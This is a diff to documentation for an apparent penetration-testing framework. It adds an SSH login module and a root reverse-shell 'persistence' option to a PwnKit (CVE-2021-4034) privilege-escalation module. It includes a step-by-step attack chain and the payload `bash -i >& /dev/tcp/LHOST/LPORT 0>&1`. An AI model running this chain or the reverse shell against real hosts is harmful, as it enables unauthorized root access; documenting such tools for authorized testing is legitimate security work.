@@ -343,6 +343,46 @@ The module probes multiple directory names as traversal bases until one returns 
 
 ---
 
+### SSH Login - `ssh_login`
+> N/A | N/A | Any SSH server
+
+**Summary**
+Authenticates to a target host via SSH using password or private key credentials, opens an interactive shell channel, and registers it as a framework session. The resulting session is fully compatible with post-exploitation modules (e.g. pwnkit_lpe) and behaves identically to a reverse shell session from the framework's perspective. Internally, the SSH channel is bridged through a local TCP socketpair so that SessionManager reads and writes it like any other shell stream.
+
+**Options**
+| Option | Default | Required | Description |
+|--------|---------|----------|-------------|
+| RHOSTS | | Yes | Target IP |
+| PORT | 22 | No | SSH port |
+| USERNAME | | Yes | SSH username |
+| PASSWORD | | No | SSH password (mutually exclusive with KEYFILE) |
+| KEYFILE | | No | Path to private key file |
+| TIMEOUT | 10 | No | Connection timeout in seconds |
+
+**Usage**
+```
+use ssh_login
+set RHOSTS 10.10.10.10
+set USERNAME admin
+set PASSWORD admin123
+strike
+```
+
+**Expected Output**
+The module connects to the target, authenticates, and opens a shell channel. On success: `[+] SSH session opened (10.10.10.10:22)` followed by `[+] Session N opened (10.10.10.10:22)`. The session then appears in `sessions -l` and can be interacted with via `sessions -i <id>` or targeted by post modules with `set SESSION <id>`.
+
+**Caveats**
+- PASSWORD and KEYFILE are mutually exclusive; set exactly one.
+- No `check` function; this module only attempts authentication.
+- The SSH channel runs without a PTY to keep output clean for the sentinel-based command/response pattern used by `exec_blocking()`. Some remote commands that require a TTY (e.g. `sudo` prompting for a password) may not work as expected.
+- The bridge thread runs in the background for the lifetime of the session. Killing the session via `sessions -k` closes the local socket, which causes the bridge thread to exit and drop the SSH connection.
+- Key-based auth uses the key file directly; agent forwarding and passphrase-protected keys are not supported.
+
+**References**
+- N/A - credential-based access tool
+
+---
+
 ### FTP Anonymous Login Scanner — `scanner/ftp`
 > N/A | N/A | FTP servers (all implementations)
 
@@ -429,12 +469,41 @@ This module uses the `register_post_module!` macro and the Session Interaction A
 | SESSION | 1 | Yes | Session ID to run on (must be an active shell session) |
 | WRITEABLE_DIR | /tmp | No | Writable directory on the remote target to stage exploit files |
 | CLEANUP | true | No | Remove staged files after execution |
+| PERSIST | false | No | Spawn a reverse shell as root after escalation |
+| LPORT | 4445 | No | Port for the root reverse shell to connect back on (only used if PERSIST=true) |
 
 **Usage**
 ```
 use post/linux/pwnkit_lpe
 set SESSION 1
 strike
+```
+
+**Usage (with PERSIST) - full multi-stage chain**
+```
+# 1. Start a listener in the background to catch the root reverse shell
+use utilities/multi_handler
+set LHOST <attacker-ip>
+set LPORT 4445
+strike -j
+
+# 2. SSH into the target as a low-privilege user
+use ssh_login
+set RHOSTS <target-ip>
+set USERNAME <username>
+set PASSWORD <password>
+strike
+
+# 3. Escalate to root through the SSH session and dispatch a reverse shell
+use post/linux/pwnkit_lpe
+set SESSION 1
+set PERSIST true
+set LPORT 4445
+strike
+
+# 4. The root shell hooks back into multi_handler as Session 2
+sessions -l
+sessions -i 2
 ```
 
 **Expected Output**
@@ -477,6 +546,7 @@ strike
 - Only works on unpatched systems: Ubuntu policykit-1 < 0.105-26ubuntu1.2, Debian polkit < 0.117-3, Fedora polkit < 0.115-13, and equivalent versions on other distributions.
 - pkexec must exist at /usr/bin/pkexec and have the SUID bit set.
 - File contents (C source code) are base64-encoded before transfer to avoid shell metacharacter issues.
+- PERSIST dispatches `bash -i >& /dev/tcp/LHOST/LPORT 0>&1 &` as root through the exploit binary. Requires bash with `/dev/tcp` support on the target and a multi_handler listening on LPORT. LHOST is read from the global framework option.
 
 **References**
 - NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-4034
